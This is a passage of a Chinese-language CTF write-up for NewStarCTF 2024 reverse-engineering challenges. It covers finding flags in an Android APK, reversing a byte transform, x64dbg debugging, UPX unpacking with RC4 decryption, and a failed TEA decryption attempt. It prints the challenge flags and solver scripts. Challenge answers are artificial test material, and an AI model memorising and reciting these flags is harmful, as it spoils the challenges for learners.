<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.EzAndroidStudy&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@drawable/ic&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;work.pangbai.ezandroidstudy.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过翻Activity清单，可以看到在<code>Homo</code>这个Activity下面有个flag1，可以得到第一段flag为<code>flag&#123;Y0u</code></p>
<h4 id="第三段flag"><a href="#第三段flag" class="headerlink" title="第三段flag"></a>第三段flag</h4><p>在<code>strings.xml</code>的底部发现第三段flag的提示</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;third&quot;</span>&gt;</span>layout 就是布局的意思呢，/res/layout 里的带 Activity 字样的 xml 文件通常是用来描述一个 Activity 的大体布局，你能找到布局里藏起来的 flag 吗喵？<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;third_fragment_label&quot;</span>&gt;</span>Session3: Layout<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>让我们去翻layout，然后在<code>/res/layout/activity_main.xml</code>找到第三段flag为<code>_900d</code></p>
<h4 id="第五段flag"><a href="#第五段flag" class="headerlink" title="第五段flag"></a>第五段flag</h4><p>第五段flag告诉我们要去逆向<code>.so</code>文件，apk里面有两个<code>.so</code>文件，想着先从小的那个开始，代码量没那么大</p>
<p>在<code>libezandroidstudy.so</code>里面，可以找到函数<code>Java_work_pangbai_ezandroidstudy_MainActivity_getflag5</code>，在底下能够看到flag5为<code>_r4V4rs4r&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/javaw_EmihUraOJh.png"></p>
<h4 id="合并flag"><a href="#合并flag" class="headerlink" title="合并flag"></a>合并flag</h4><p>flag合起来就变成了<code>flag&#123;Y0u_@r4_900d_andr01d_r4V4rs4r&#125;</code></p>
<h3 id="Simple-encryption"><a href="#Simple-encryption" class="headerlink" title="Simple_encryption"></a>Simple_encryption</h3><blockquote>
<p>一眼秒的算法</p>
<p>【难度：简单】</p>
</blockquote>
<p>透过IDA我们可以看到算法具体如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/ida64_OWOitkRqR2.png"></p>
<p>则有输入字符 <code>input[j]</code> 的计算方式为：</p>
<ul>
<li>如果 <code>j % 3 == 0</code>：<code>input[j] = buffer[k] + 31</code></li>
<li>如果 <code>j % 3 == 1</code>：<code>input[j] = buffer[k] - 41</code></li>
<li>如果 <code>j % 3 == 2</code>：<code>input[j] = buffer[k] ^ 0x55</code></li>
</ul>
<p>双击伪代码里的buffer，可以得到它的值</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/ida64_GTgpa6mqAl.png"></p>
<p>于是可以写出解密代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">buffer = [</span><br><span class="line">    <span class="number">0x47</span>,</span><br><span class="line">    <span class="number">0x95</span>,</span><br><span class="line">    <span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0xA4</span>,</span><br><span class="line">    <span class="number">0x1C</span>,</span><br><span class="line">    <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x88</span>,</span><br><span class="line">    <span class="number">0x64</span>,</span><br><span class="line">    <span class="number">0x16</span>,</span><br><span class="line">    <span class="number">0x88</span>,</span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    <span class="number">0x14</span>,</span><br><span class="line">    <span class="number">0x6A</span>,</span><br><span class="line">    <span class="number">0x39</span>,</span><br><span class="line">    <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0xA2</span>,</span><br><span class="line">    <span class="number">0x0A</span>,</span><br><span class="line">    <span class="number">0x37</span>,</span><br><span class="line">    <span class="number">0x5C</span>,</span><br><span class="line">    <span class="number">7</span>,</span><br><span class="line">    <span class="number">0x5A</span>,</span><br><span class="line">    <span class="number">0x56</span>,</span><br><span class="line">    <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0x25</span>,</span><br><span class="line">    <span class="number">0x12</span>,</span><br><span class="line">    <span class="number">0x8E</span>,</span><br><span class="line">    <span class="number">0x28</span>,</span><br><span class="line">]</span><br><span class="line">input_chars = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(buffer)):</span><br><span class="line">    <span class="keyword">if</span> j % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        input_chars.append(buffer[j] + <span class="number">31</span>)</span><br><span class="line">    <span class="keyword">elif</span> j % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        input_chars.append(buffer[j] - <span class="number">41</span>)</span><br><span class="line">    <span class="keyword">elif</span> j % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">        input_chars.append(buffer[j] ^ <span class="number">0x55</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字符</span></span><br><span class="line">input_string = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> input_chars)</span><br><span class="line"><span class="built_in">print</span>(input_string)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_PQy5Z4URpl.png"></p>
<h3 id="ez-debug"><a href="#ez-debug" class="headerlink" title="ez_debug"></a>ez_debug</h3><blockquote>
<p>动态调试(可能xdbg会更简单哦)</p>
<p>【难度：简单】</p>
</blockquote>
<p>题目告诉我们用xdbg调试，就试试呗（反正没用过）</p>
<p>我先 右键-&gt;搜索-&gt;所有模块-&gt;字符串 看看能不能找到什么东西，但是找不到，只能看到一些可阅读的有意义的东西，所以我咋这些地方按下了<kbd>F2</kbd>设置了一下breakpoint</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/x64dbg_l5EnyrBVck.png"></p>
<p>然后不断步进，在输入了flag后，可以看到调用了0x401D2A的<code>Decrypted flag</code>，在这个周围可以看到flag为<code>flag&#123;y0u_ar3_g0od_@_Debu9&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/x64dbg_3rLpDqRUyN.png"></p>
<h3 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h3><blockquote>
<p>你知道upx吗？</p>
<p>【难度：简单】</p>
</blockquote>
<p>题目告诉我们是UPX了，我们要使用的项目为Github上的UPX &#x3D;&gt; <a href="https://github.com/upx/upx">upx&#x2F;upx: UPX - the Ultimate Packer for eXecutables (github.com)</a></p>
<p>因为套壳了我们没发反编译，所以得先用UPX去壳</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ upx -d upx</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_JaU3gsXxkw.png"></p>
<p>去壳后丢进IDA，能看到接受的输入长度为22，即flag长度应该为22</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/ida64_bY0fwWBxuy.png"></p>
<p>在IDA里面，可以看到<code>before_main</code>函数，里面有一些内容</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/ida64_2Gx7Axtmhq.png"></p>
<p>猜测这些字符是与密钥进行RC4运算的字符编码，而RC4是对称的（加密即解密），所以我们需要找到密钥</p>
<p>而往下翻到数据去，可以看到有个变量为<code>aNewStar</code>，其内容为<code>NewStar</code>，应该就是拿来参与RC4运算的密钥了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/ida64_uvSSkGvjDP.png"></p>
<p>RC4要求用正整数，所以我们需要把负数转为无符号八位整数，存在以下规则</p>
<p><svg xmlns="http://www.w3.org/2000/svg" width="26.588ex" height="2.149ex" viewBox="0 -750 11752 950" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style=""><defs><path id="MJX-30-TEX-N-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path><path id="MJX-30-TEX-N-32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path id="MJX-30-TEX-N-35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path><path id="MJX-30-TEX-N-36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path id="MJX-30-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mo"><text data-variant="normal" transform="matrix(1 0 0 -1 0 0)" font-size="814.4px" font-family="serif">带</text><text data-variant="normal" transform="translate(814, 0) matrix(1 0 0 -1 0 0)" font-size="814.4px" font-family="serif">符</text><text data-variant="normal" transform="translate(1628.1, 0) matrix(1 0 0 -1 0 0)" font-size="814.4px" font-family="serif">号</text><text data-variant="normal" transform="translate(2442.1, 0) matrix(1 0 0 -1 0 0)" font-size="814.4px" font-family="serif">整</text><text data-variant="normal" transform="translate(3256.2, 0) matrix(1 0 0 -1 0 0)" font-size="814.4px" font-family="serif">数</text></g><g data-mml-node="mo" transform="translate(4348, 0)"><use xlink:href="#MJX-30-TEX-N-2B"></use></g><g data-mml-node="mn" transform="translate(5126, 0)"><use xlink:href="#MJX-30-TEX-N-32"></use><use xlink:href="#MJX-30-TEX-N-35" transform="translate(500, 0)"></use><use xlink:href="#MJX-30-TEX-N-36" transform="translate(1000, 0)"></use></g><g data-mml-node="mo" transform="translate(6903.8, 0)"><use xlink:href="#MJX-30-TEX-N-3D"></use><text data-variant="normal" transform="translate(778, 0) matrix(1 0 0 -1 0 0)" font-size="814.4px" font-family="serif">无</text><text data-variant="normal" transform="translate(1592, 0) matrix(1 0 0 -1 0 0)" font-size="814.4px" font-family="serif">符</text><text data-variant="normal" transform="translate(2406.1, 0) matrix(1 0 0 -1 0 0)" font-size="814.4px" font-family="serif">号</text><text data-variant="normal" transform="translate(3220.1, 0) matrix(1 0 0 -1 0 0)" font-size="814.4px" font-family="serif">整</text><text data-variant="normal" transform="translate(4034.2, 0) matrix(1 0 0 -1 0 0)" font-size="814.4px" font-family="serif">数</text></g></g></g></svg></p>
<p>所以就写个脚本计算就行了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"><span class="comment"># RC4密钥</span></span><br><span class="line">key = <span class="string">b&quot;NewStar&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data值</span></span><br><span class="line"><span class="comment"># 注：原来的值应该为bytearray([-60, 96, -81, -71, -29, -1, 46, -101, -11, 16, 86, 81, 110, -18, 95, 125, 125, 110, 43, -100, 117, -75])</span></span><br><span class="line">encrypted_data = <span class="built_in">bytearray</span>([<span class="number">196</span>, <span class="number">96</span>, <span class="number">175</span>, <span class="number">185</span>, <span class="number">227</span>, <span class="number">255</span>, <span class="number">46</span>, <span class="number">155</span>, <span class="number">245</span>, <span class="number">16</span>, <span class="number">86</span>, <span class="number">81</span>, <span class="number">110</span>, <span class="number">238</span>, <span class="number">95</span>, <span class="number">125</span>, <span class="number">125</span>, <span class="number">110</span>, <span class="number">43</span>, <span class="number">156</span>, <span class="number">117</span>, <span class="number">181</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建RC4解密对象</span></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密data</span></span><br><span class="line">decrypted_data = cipher.decrypt(encrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span>, decrypted_data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_BfSuo6QgJ3.png"></p>
<p>得到flag为<code>flag&#123;Do_you_know_UPX?&#125;</code></p>
<h3 id="drink-TEA（未做出）"><a href="#drink-TEA（未做出）" class="headerlink" title="drink_TEA（未做出）"></a>drink_TEA（未做出）</h3><blockquote>
<p>来喝茶吧</p>
<p>【难度：简单】</p>
</blockquote>
<p>题目说喝茶，我其实没什么抓手，但是茶是TEA，我就在想是不是什么加密方法叫TEA，所以去查了一下还真的有</p>
<p>下面是main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-28h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+28h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  sub_140001070((__int64)aPleaseInput, argv, envp);</span><br><span class="line">  sub_140001120(<span class="string">&quot;%32s&quot;</span>, Buf1);</span><br><span class="line">  v5 = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v5;</span><br><span class="line">  <span class="keyword">while</span> ( Buf1[v5] );</span><br><span class="line">  <span class="keyword">if</span> ( v5 == dword_140004078 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_140004078; i += <span class="number">8</span> )</span><br><span class="line">      sub_140001180((<span class="type">unsigned</span> <span class="type">int</span> *)&amp;Buf1[i], aWelcometonewst);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(Buf1, &amp;unk_140004080, dword_140004078) )</span><br><span class="line">      sub_140001070((__int64)aRight);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_140001070((__int64)aWrong_0);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_140001070((__int64)aWrong);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在main函数中找到函数<code>sub_140001180</code>，可以看到里面的具体加密方式，跟TEA很像</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/ida64_WkWgneoXwG.png"></p>
<p>得到<code>delta</code>为<code>1640531527</code>，其中传入的密钥为<code>aWelcometonewst</code>，找了一下内容是<code>WelcomeToNewStar</code></p>
<p>此外，网上找可以找到<code>unk_140004080</code>，存放的应该是真正的flag经过TEA加密后的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000140004080 unk_140004080   db  78h ; x             ; DATA XREF: main+BF↑o</span><br><span class="line">.data:0000000140004081                 db  20h</span><br><span class="line">.data:0000000140004082                 db 0F7h</span><br><span class="line">.data:0000000140004083                 db 0B3h</span><br><span class="line">.data:0000000140004084                 db 0C5h</span><br><span class="line">.data:0000000140004085                 db  42h ; B</span><br><span class="line">.data:0000000140004086                 db 0CEh</span><br><span class="line">.data:0000000140004087                 db 0DAh</span><br><span class="line">.data:0000000140004088                 db  85h</span><br><span class="line">.data:0000000140004089                 db  59h ; Y</span><br><span class="line">.data:000000014000408A                 db  21h ; !</span><br><span class="line">.data:000000014000408B                 db  1Ah</span><br><span class="line">.data:000000014000408C                 db  26h ; &amp;</span><br><span class="line">.data:000000014000408D                 db  56h ; V</span><br><span class="line">.data:000000014000408E                 db  5Ah ; Z</span><br><span class="line">.data:000000014000408F                 db  59h ; Y</span><br><span class="line">.data:0000000140004090                 db  29h ; )</span><br><span class="line">.data:0000000140004091                 db    2</span><br><span class="line">.data:0000000140004092                 db  0Dh</span><br><span class="line">.data:0000000140004093                 db 0EDh</span><br><span class="line">.data:0000000140004094                 db    7</span><br><span class="line">.data:0000000140004095                 db 0A8h</span><br><span class="line">.data:0000000140004096                 db 0B9h</span><br><span class="line">.data:0000000140004097                 db 0EEh</span><br><span class="line">.data:0000000140004098                 db  36h ; 6</span><br><span class="line">.data:0000000140004099                 db  59h ; Y</span><br><span class="line">.data:000000014000409A                 db  11h</span><br><span class="line">.data:000000014000409B                 db  87h</span><br><span class="line">.data:000000014000409C                 db 0FDh</span><br><span class="line">.data:000000014000409D                 db  5Ch ; \</span><br><span class="line">.data:000000014000409E                 db  23h ; #</span><br><span class="line">.data:000000014000409F                 db  24h ; $</span><br></pre></td></tr></table></figure>

<p>所以可以让GPT写出脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">DELTA = <span class="number">0x9E3779B9</span></span><br><span class="line">NUM_ROUNDS = <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_tea_decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;根据你的C代码实现的TEA解密函数&quot;&quot;&quot;</span></span><br><span class="line">    v0, v1 = v</span><br><span class="line">    v5 = DELTA * NUM_ROUNDS  <span class="comment"># 初始化v5</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(NUM_ROUNDS):</span><br><span class="line">        v1 -= (k[<span class="number">3</span>] + (v0 &gt;&gt; <span class="number">5</span>)) ^ (v5 + v0) ^ (k[<span class="number">2</span>] + <span class="number">16</span> * v0)</span><br><span class="line">        v1 &amp;= <span class="number">0xFFFFFFFF</span>  <span class="comment"># 保持32位</span></span><br><span class="line">        v0 -= (k[<span class="number">1</span>] + (v1 &gt;&gt; <span class="number">5</span>)) ^ (v5 + v1) ^ (k[<span class="number">0</span>] + <span class="number">16</span> * v1)</span><br><span class="line">        v0 &amp;= <span class="number">0xFFFFFFFF</span>  <span class="comment"># 保持32位</span></span><br><span class="line">        v5 += DELTA  <span class="comment"># v5增加delta值（解密时增加）</span></span><br><span class="line">    <span class="keyword">return</span> v0, v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_ints</span>(<span class="params">b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将8字节数据块转换为两个32位整数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(b[:<span class="number">4</span>], byteorder=<span class="string">&#x27;big&#x27;</span>), <span class="built_in">int</span>.from_bytes(b[<span class="number">4</span>:], byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ints_to_bytes</span>(<span class="params">v0, v1</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将两个32位整数转换为8字节数据块&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> v0.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;big&#x27;</span>) + v1.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># TEA 密钥 (WelcomeToNewStar)</span></span><br><span class="line">key = [<span class="number">0x57656C63</span>, <span class="number">0x6F6D6554</span>, <span class="number">0x6F4E6577</span>, <span class="number">0x53746172</span>]  <span class="comment"># &quot;WelcomeToNewStar&quot; 的16进制表示</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密后的目标数据 (32字节)</span></span><br><span class="line">encrypted_data = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x20</span>, <span class="number">0xF7</span>, <span class="number">0xB3</span>, <span class="number">0xC5</span>, <span class="number">0x42</span>, <span class="number">0xCE</span>, <span class="number">0xDA</span>,</span><br><span class="line">    <span class="number">0x85</span>, <span class="number">0x59</span>, <span class="number">0x21</span>, <span class="number">0x1A</span>, <span class="number">0x26</span>, <span class="number">0x56</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>,</span><br><span class="line">    <span class="number">0x29</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0xED</span>, <span class="number">0x07</span>, <span class="number">0xA8</span>, <span class="number">0xB9</span>, <span class="number">0xEE</span>,</span><br><span class="line">    <span class="number">0x36</span>, <span class="number">0x59</span>, <span class="number">0x11</span>, <span class="number">0x87</span>, <span class="number">0xFD</span>, <span class="number">0x5C</span>, <span class="number">0x23</span>, <span class="number">0x24</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">decrypted_message = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encrypted_data), <span class="number">8</span>):</span><br><span class="line">    block = encrypted_data[i:i + <span class="number">8</span>]</span><br><span class="line">    v0, v1 = bytes_to_ints(block)</span><br><span class="line">    d0, d1 = custom_tea_decrypt((v0, v1), key)</span><br><span class="line">    decrypted_message += ints_to_bytes(d0, d1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出解密后的数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的明文:&quot;</span>, decrypted_message)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是实测解不出来什么有意义的内容，可能是我找错了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_oh8akkMkbw.png"></p>
<h3 id="ezencrypt（未做出）"><a href="#ezencrypt（未做出）" class="headerlink" title="ezencrypt（未做出）"></a>ezencrypt（未做出）</h3><blockquote>
